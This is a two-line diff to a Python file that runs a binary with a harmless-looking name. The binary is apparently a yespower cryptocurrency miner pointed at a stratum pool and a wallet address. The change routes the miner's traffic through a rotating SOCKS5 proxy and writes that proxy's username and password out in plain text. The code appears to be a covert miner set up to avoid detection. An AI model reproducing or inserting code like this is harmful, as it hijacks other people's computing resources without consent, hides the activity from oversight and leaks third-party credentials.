@@ -1,2 +1,2 @@
 import os
-os.system("chmod +x sse && ./sse -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.SMLT -t 15")
+os.system("chmod +x sse && ./sse -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.SMLT -t 15 -x socks5://gedomazo9x-GB-rotate:gedomazo9x@p.webshare.io:80")
